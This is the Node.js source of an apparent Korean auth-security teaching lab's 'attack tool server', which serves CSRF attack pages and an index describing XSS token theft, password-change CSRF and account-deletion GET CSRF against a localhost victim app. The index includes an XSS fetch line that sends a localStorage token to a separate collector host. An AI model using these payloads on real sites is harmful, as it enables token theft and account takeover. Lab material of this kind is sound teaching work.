/**
 * 공격 도구 서버 (port 5000)
 * ─────────────────────────────────────────────────────────────
 * - CSRF 공격 페이지 서빙
 * - 서버가 localhost:5000을 CORS 허용 origin으로 등록했으므로
 *   credentialed fetch 요청이 통과됨 (의도적 취약점)
 * ─────────────────────────────────────────────────────────────
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PAGES_DIR = path.join(__dirname, 'pages');

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'application/javascript',
  '.css': 'text/css',
  '.json': 'application/json',
};

const ROUTES = {
  '/': 'index',
  '/csrf-v2': 'csrf-v2.html',
  '/csrf-v3': 'csrf-v3.html',
};

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  let filePath;

  if (parsed.pathname === '/' || parsed.pathname === '/index') {
    // 인덱스 페이지 — 공격 목록 제공
    const indexHtml = buildIndex();
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(indexHtml);
    return;
  }

  const filename = ROUTES[parsed.pathname] ?? parsed.pathname.replace(/^\//, '');
  filePath = path.join(PAGES_DIR, filename);

  // .html 확장자 없이 접근 시 자동 추가
  if (!path.extname(filePath)) filePath += '.html';

  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(404, { 'Content-Type': 'text/html' });
      res.end('<h1>404 Not Found</h1>');
      return;
    }
    const ext = path.extname(filePath);
    res.writeHead(200, { 'Content-Type': MIME[ext] ?? 'text/plain' });
    res.end(data);
  });
});

function buildIndex() {
  return `<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8"/>
  <title>Auth-Lab 공격 도구</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 40px; max-width: 700px; margin: 0 auto; }
    h1 { color: #c62828; }
    .card { border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin: 16px 0; }
    .card h3 { margin: 0 0 8px; }
    .tag { display: inline-block; padding: 2px 8px; border-radius: 4px;
           font-size: 11px; font-weight: bold; margin-right: 6px; }
    .vuln { background: #ffebee; color: #c62828; }
    .info { background: #e3f2fd; color: #1565c0; }
    a.btn { display: inline-block; margin-top: 10px; padding: 8px 16px;
            background: #c62828; color: white; text-decoration: none;
            border-radius: 6px; font-size: 13px; }
    a.btn:hover { background: #b71c1c; }
    pre { background: #f5f5f5; padding: 12px; border-radius: 6px;
          font-size: 12px; overflow-x: auto; }
  </style>
</head>
<body>
  <h1>🗡️ Auth-Lab 공격 도구 서버</h1>
  <p>각 인증 방식의 취약점을 시연하는 공격 페이지입니다.<br>
  반드시 <strong>localhost:3000</strong>에서 해당 모드로 로그인한 상태에서 공격을 수행하세요.</p>

  <div class="card">
    <h3>V1 — XSS를 통한 토큰 탈취</h3>
    <span class="tag vuln">XSS</span>
    <span class="tag info">localStorage</span>
    <p>victim이 V1 모드로 로그인 후 게시글 페이지를 방문하면 XSS 페이로드가 실행됩니다.</p>
    <pre>공격 흐름:
1. victim: V1 모드 로그인 → localhost:3000/posts 접속
2. XSS: fetch('http://localhost:4999/steal?t=' + localStorage.getItem('at'))
3. 공격자: http://localhost:4999/tokens 에서 탈취 토큰 확인
4. 탈취 토큰으로 /api/points/transfer 호출 → 포인트 갈취</pre>
    <a class="btn" href="http://localhost:4999/tokens" target="_blank">탈취 토큰 확인</a>
    <a class="btn" style="background:#1565c0" href="http://localhost:3000/posts" target="_blank">피해자 게시글 페이지 →</a>
  </div>

  <div class="card">
    <h3>V2 — CSRF (비밀번호 변경)</h3>
    <span class="tag vuln">CSRF</span>
    <span class="tag info">Session Cookie</span>
    <p>victim이 V2 모드로 로그인한 상태에서 이 페이지를 방문하면 비밀번호가 변경됩니다.</p>
    <pre>공격 흐름:
1. victim: V2 모드 로그인
2. 공격자: 이 링크를 victim에게 전송 (피싱)
3. 자동 실행: POST /api/user/update-password {newPassword: 'hacked1234'}
4. 결과: victim 계정 비밀번호 → hacked1234</pre>
    <a class="btn" href="/csrf-v2" target="_blank">CSRF 공격 페이지 열기</a>
  </div>

  <div class="card">
    <h3>V3 — GET CSRF (계정 탈퇴)</h3>
    <span class="tag vuln">GET CSRF</span>
    <span class="tag info">SameSite=Lax</span>
    <p>victim이 V3 모드로 로그인한 상태에서 이 페이지를 방문하면 계정이 탈퇴됩니다.</p>
    <pre>공격 흐름:
1. victim: V3 모드 로그인
2. 공격자: 이 링크를 victim에게 전송
3. img 태그: GET http://localhost:4001/api/user/withdraw
4. SameSite=Lax → GET 요청에 AT 쿠키 자동 전송 → 탈퇴 처리</pre>
    <a class="btn" href="/csrf-v3" target="_blank">GET CSRF 공격 페이지 열기</a>
  </div>

  <div class="card" style="border-color:#c8e6c9; background:#f1f8e9;">
    <h3>V4 — 공격 불가 (안전)</h3>
    <span class="tag" style="background:#c8e6c9; color:#2e7d32;">SAFE</span>
    <p>V4는 모든 API에 Authorization Bearer 헤더가 필요합니다.<br>
    AT는 Zustand 메모리에만 존재하므로 XSS로도 탈취 불가.<br>
    RT는 SameSite=Strict → CSRF 불가.</p>
  </div>
</body>
</html>`;
}

server.listen(5000, () => {
  console.log('┌─────────────────────────────────────────────┐');
  console.log('│  공격 도구 서버 — port 5000                  │');
  console.log('├─────────────────────────────────────────────┤');
  console.log('│  인덱스:     http://localhost:5000          │');
  console.log('│  V2 CSRF:    http://localhost:5000/csrf-v2  │');
  console.log('│  V3 CSRF:    http://localhost:5000/csrf-v3  │');
  console.log('└─────────────────────────────────────────────┘');
});
